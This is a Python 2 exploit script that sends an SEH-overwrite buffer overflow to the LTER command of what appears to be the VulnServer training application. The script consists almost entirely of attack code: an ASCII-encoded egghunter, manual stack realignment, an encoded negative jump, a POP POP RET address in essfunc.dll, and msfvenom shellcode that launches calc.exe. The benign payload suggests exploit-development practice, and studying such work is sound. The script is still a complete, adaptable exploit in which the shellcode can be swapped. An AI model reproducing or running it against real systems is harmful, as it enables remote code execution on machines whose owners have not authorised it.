#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f python -b '\x00\x0a\x0d' -v shellcode bufferregister=edi
# Size 440 bytes
shellcode =  ""
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x6b\x4c\x6b\x58\x4b\x32\x47\x70"
shellcode += "\x37\x70\x35\x50\x35\x30\x4d\x59\x5a\x45\x35\x61"
shellcode += "\x49\x50\x35\x34\x6c\x4b\x46\x30\x34\x70\x6e\x6b"
shellcode += "\x63\x62\x76\x6c\x6c\x4b\x43\x62\x36\x74\x4c\x4b"
shellcode += "\x34\x32\x64\x68\x54\x4f\x6d\x67\x70\x4a\x66\x46"
shellcode += "\x50\x31\x59\x6f\x4e\x4c\x75\x6c\x50\x61\x43\x4c"
shellcode += "\x56\x62\x76\x4c\x77\x50\x6a\x61\x58\x4f\x66\x6d"
shellcode += "\x65\x51\x6a\x67\x5a\x42\x6a\x52\x56\x32\x72\x77"
shellcode += "\x6c\x4b\x70\x52\x44\x50\x4e\x6b\x53\x7a\x37\x4c"
shellcode += "\x6c\x4b\x42\x6c\x47\x61\x43\x48\x6a\x43\x70\x48"
shellcode += "\x45\x51\x78\x51\x36\x31\x6c\x4b\x46\x39\x47\x50"
shellcode += "\x43\x31\x4b\x63\x4c\x4b\x53\x79\x77\x68\x79\x73"
shellcode += "\x37\x4a\x71\x59\x4c\x4b\x35\x64\x4c\x4b\x35\x51"
shellcode += "\x38\x56\x44\x71\x4b\x4f\x6e\x4c\x6a\x61\x78\x4f"
shellcode += "\x66\x6d\x65\x51\x6b\x77\x37\x48\x79\x70\x71\x65"
shellcode += "\x58\x76\x66\x63\x51\x6d\x6b\x48\x47\x4b\x33\x4d"
shellcode += "\x51\x34\x63\x45\x6d\x34\x73\x68\x4e\x6b\x33\x68"
shellcode += "\x77\x54\x37\x71\x4b\x63\x51\x76\x4c\x4b\x76\x6c"
shellcode += "\x32\x6b\x4e\x6b\x30\x58\x75\x4c\x73\x31\x78\x53"
shellcode += "\x6c\x4b\x76\x64\x6c\x4b\x53\x31\x38\x50\x6f\x79"
shellcode += "\x72\x64\x66\x44\x57\x54\x51\x4b\x33\x6b\x75\x31"
shellcode += "\x61\x49\x42\x7a\x36\x31\x4b\x4f\x49\x70\x43\x6f"
shellcode += "\x31\x4f\x72\x7a\x4c\x4b\x65\x42\x6a\x4b\x6c\x4d"
shellcode += "\x33\x6d\x62\x4a\x53\x31\x6e\x6d\x4b\x35\x4d\x62"
shellcode += "\x67\x70\x65\x50\x47\x70\x70\x50\x31\x78\x50\x31"
shellcode += "\x6e\x6b\x72\x4f\x6e\x67\x39\x6f\x38\x55\x6d\x6b"
shellcode += "\x48\x70\x58\x35\x79\x32\x30\x56\x72\x48\x39\x36"
shellcode += "\x4a\x35\x4d\x6d\x4d\x4d\x39\x6f\x6e\x35\x37\x4c"
shellcode += "\x45\x56\x61\x6c\x75\x5a\x4b\x30\x6b\x4b\x6b\x50"
shellcode += "\x32\x55\x53\x35\x6f\x4b\x43\x77\x77\x63\x32\x52"
shellcode += "\x30\x6f\x53\x5a\x65\x50\x43\x63\x69\x6f\x79\x45"
shellcode += "\x50\x63\x43\x51\x72\x4c\x55\x33\x56\x4e\x75\x35"
shellcode += "\x72\x58\x62\x45\x63\x30\x41\x41"

# Egghunter ODOR, ASCII encoded
egghunt = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x59\x55\x3d\x55\x2d\x71\x01\x01\x01\x2d\x6b\x6b\x6b\x6b\x2d\x56\x56\x56\x56\x50\x2d\x59\x06\x48\x5b\x2d\x06\x06\x67\x76\x2d\x5e\x5e\x5e\x5e\x2d\x09\x07\x08\x08\x50\x2d\x7c\x33\x79\x33\x2d\x71\x74\x67\x03\x2d\x2d\x2d\x2d\x2d\x2d\x51\x51\x51\x51\x50\x2d\x4a\x7b\x39\x7b\x2d\x48\x59\x3d\x6e\x2d\x4d\x4d\x4d\x4d\x2d\x76\x74\x74\x74\x50\x2d\x7d\x7d\x7d\x7d\x2d\x03\x03\x43\x25\x2d\x01\x01\x06\x06\x2d\x32\x32\x32\x32\x50\x2d\x37\x6d\x4d\x07\x2d\x31\x6c\x6c\x6c\x2d\x57\x57\x57\x57\x2d\x7b\x7c\x7b\x7a\x50\x2d\x6a\x49\x7c\x3e\x2d\x07\x4a\x7c\x03\x2d\x4a\x4a\x4a\x4a\x2d\x38\x38\x38\x38\x50\x2d\x5f\x5f\x3b\x5f\x2d\x06\x56\x06\x01\x2d\x3b\x02\x3d\x01\x2d\x09\x09\x09\x09\x50"

# Eggstring
egg = "ODOR"[::-1] * 2

# Max length
maxlen = 6000

# Crash offsets
crash_ecx = 3555
crash_edx = crash_ecx - 4
crash_seh = 3535 - 16
crash_nseh = crash_seh - 4

# Return after jumping in NSEH
ret_nseh = 3407

# Stage 3 length for placing shellcode
stage3len = 1700

# NOP's
fill = "A" * ret_nseh

# ESP realignments
align_esp_s2 = ("\x54"                  # PUSH ESP
                "\x58"                  # POP EAX
                "\x66\x2d\x25\x06"      # SUB AX, 0x625
                "\x50"                  # PUSH EAX
                "\x5c")                 # POP ESP
                

align_esp_s1 = ("\x54"                  # PUSH ESP
                "\x58"                  # POP EAX
                "\x66\x05\x92\x11"      # ADD AX,0x1192
                "\x04\x40"              # ADD AL,0x40
                "\x04\x50"              # ADD AL, 0x50
                "\x50"                  # PUSH EAX
                "\x5c")                 # POP ESP

# JMP 0xfffff8e3 - Negative Jump
neg_jmp_s1 = (  "\x25\x4a\x4d\x4e\x55"  # and eax,0x554e4d4a
                "\x25\x35\x32\x31\x2a"  # and eax,0x554e4d4a
                "\x2d\x41\x37\x37\x37"  # sub eax,0x37373741                
                "\x2d\x69\x25\x25\x25"  # sub eax,0x25252569
                "\x2d\x72\x32\x49\x49"  # sub eax,0x49493272
                "\x2d\x5c\x5a\x5a\x5a"  # sub eax,0x5a5a5a5c
                "\x50"                  # push eax
                "\x25\x4a\x4d\x4e\x55"  # and eax,0x554e4d4a
                "\x25\x35\x32\x31\x2a"  # and eax,0x2a313235
                "\x2d\x44\x01\x25\x25"  # sub eax,0x25250144
                "\x2d\x75\x25\x02\x02"  # sub eax,0x2022575
                "\x2d\x03\x03\x03\x03"  # sub eax,0x3030303
                "\x2d\x45\x45\x45\x45"  # sub eax,0x45454545
                "\x50"                  # push eax
                "\x2d\x52\x02\x56\x56"  # sub eax,0x56560252
                "\x2d\x4c\x4c\x06\x03"  # sub eax,0x3064c4c
                "\x2d\x41\x2d\x05\x01"  # sub eax,0x1052d41
                "\x2d\x37\x36\x36\x36"  # sub eax,0x36363637
                "\x50" )                # push eax

# Stage 3
# Egg and shellcode
stage3 = "A" * 8
stage3 += egg
stage3 += shellcode
stage3 += "A" * (stage3len - len(stage3))

# Stage 2
# Egghunter
stage2 = "B" * 8
stage2 += align_esp_s2
stage2 += egghunt
stage2 += "B" * (ret_nseh - len(stage2 + stage3))

# Stage 1
# Align ESP and JMP EAX
stage1 = align_esp_s1 + neg_jmp_s1
stage1 += "C" * (crash_nseh - len(stage1 + stage2 + stage3))

# After NSEH jump, returns at memory address 008AFF50
nseh = struct.pack("<L", 0xff774c4c)        # DEC ESP # DEC ESP # JNO 0x3 # Jumps 0x80 back on ESP, converts 0xff to 0x80 # Jumps 0x7E back
seh = struct.pack("<L", 0x6250120B)         # POP POP RET # 0x6250120B # essfunc.dll
suffix = "D" * (maxlen - len(stage3 + stage2 + stage1 + nseh + seh))

# Construct payload
payload = stage3 + stage2 + stage1 + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        req = (
                "LTER /.:/" +
                payload +
                "\r\n"
        )

        print "[+] Sending triggering payload of " + str(len(payload)) + " length message..."

        # Send triggering payload    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.recv(1024)
        s.send(req)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


